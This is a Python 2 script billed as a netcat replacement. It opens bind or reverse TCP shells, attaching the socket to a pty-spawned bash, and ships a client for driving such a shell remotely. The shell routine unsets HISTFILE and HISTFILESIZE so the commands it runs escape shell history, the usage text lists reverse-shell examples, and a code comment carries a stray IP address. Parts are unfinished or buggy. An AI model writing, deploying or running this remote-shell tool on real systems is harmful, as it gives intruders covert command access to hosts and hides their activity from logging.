#!/usr/bin/python3  
# -*- coding: utf-8 -*-  

import os
import pty
import sys
import socket
import getopt
import threading


class Netcat(threading.Thread):
    bash = '/bin/bash'
    shell = 1
    reshell = 2
    recv_file = 3
    connect = 4

    def __init__(self, sock, opt_id, outfile_path=None):
        super(Netcat, self).__init__()
        self.sock = sock
        self.opt_id = opt_id
        self.outfile_path = outfile_path

    def close(self):
        self.sock.close()

    def start_shell(self):
        os.dup2(self.sock.fileno(), 0)
        os.dup2(self.sock.fileno(), 1)
        os.dup2(self.sock.fileno(), 2)
        os.unsetenv('HISTFILE')
        os.unsetenv('HISTFILESIZE')
        pty.spawn(self.bash)
        self.close()

    def connect_shell(self):
        bash_str = self.sock.recv(128)
        bash_str = bash_str[8:]
        bash_len = len(bash_str)
        data = bash_str
        while True:
            cmd = raw_input(data)
            if cmd in ('exit', 'quite'):
                break
            self.sock.sendall(cmd + '\n')

            data = ''
            while True:
                data += self.sock.recv(1024 * 2)
                if data[-bash_len:] == bash_str:
                    break

        self.close()

    def upload(self):
        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available 106.13.99.250
        while True:
            data = self.sock.recv(1024)
            if not data:
                break
            file_buffer += data

        # now we take these bytes and try to write them out
        if file_buffer:
            file_descriptor = open(self.outfile_path, 'wb')
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            self.sock.send('Successfully saved file to %s\r\n' % self.outfile_path)
        else:
            self.sock.send('Failed to save file to %s\r\n' % self.outfile_path)

    def run(self):
        if self.opt_id in (self.reshell, self.connect):
            print '[*] Connect Shell.'
            self.connect_shell()
        elif self.opt_id == self.shell:
            print '[*] Start Shell.'
            self.start_shell()
        elif self.opt_id == self.upload:
            self.upload()


def usage():
    project_name = os.path.basename(sys.argv[0])
    print 'Netcat Replacement'
    print
    print 'Usage: {} -l [ip] -p [port]'.format(project_name)
    print '-l --listen                - listen on [host] for incoming connections'
    print '-p --port                - listen on [port] for incoming connections'
    print '-e --execute=file_to_run   - execute the given file upon receiving a connection'
    print '-s --shell                 - initialize a command shell'
    print '-r --reshell               - connect reverse command shell'
    # print '-f --upload=destination    - upon receiving connection upload a file and write to [destination]'
    print
    print
    print 'Examples: '
    print '{} -l 0.0.0.0 -p8080 --shell'.format(project_name)
    print '{} -t 0.0.0.0 -p8080 --connect'.format(project_name)
    print '{} -l 0.0.0.0 -p8080 --reshell'.format(project_name)
    print '{} -t 192.168.0.1 -p 5555 --reshell'.format(project_name)
    # print '{} -t 192.168.0.1 -p 5555 -f /tmp/1.txt '.format(project_name)
    sys.exit(0)


def main():
    opts = []
    listen = False
    ip = '0.0.0.0'
    port = 8081
    opt_id = 0
    ncs = []
    outfile_path = ''

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hl:t:p:f:',
                                   ['help', 'listen', 'target', 'port', 'shell', 'reshell', 'upload', 'connect'])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
        elif o in ('-l', '--listen'):
            ip = a
            listen = True
        elif o in ('-p', '--port'):
            port = int(a)
        elif o in ('-t', '--target'):
            ip = a
        elif o in ('--reshell',):
            opt_id = Netcat.reshell
        elif o in ('--shell',):
            opt_id = Netcat.shell
            # TODO
            '''elif o in ('-f', '--upload'):
                opt_id = Netcat.recv_file
                outfile_path = o'''
        elif o in ('--connect',):
            opt_id = Netcat.connect
        else:
            assert False, 'Unhandled Option'

    assert opt_id, 'Unknown Options, --shell, --reshell, --upload, --connect'

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if listen:
            sock.bind((ip, port))
            sock.listen(5)
            while True:
                print '[*] Listening on {}:{}'.format(ip, port)
                client_sock, addr = sock.accept()
                print '[*] Accept connection from  {}:{}'.format(addr[0], addr[1])
                nc = Netcat(client_sock, opt_id)
                nc.start()
                ncs.append(nc)
        else:
            sock.connect((ip, port))
            print '[*] Connect {}:{}'.format(ip, port)
            nc = Netcat(sock, opt_id)
            nc.run()
            ncs.append(nc)
    except Exception as e:
        print e

    for nc in ncs:
        nc.close()


if __name__ == '__main__':
    main()
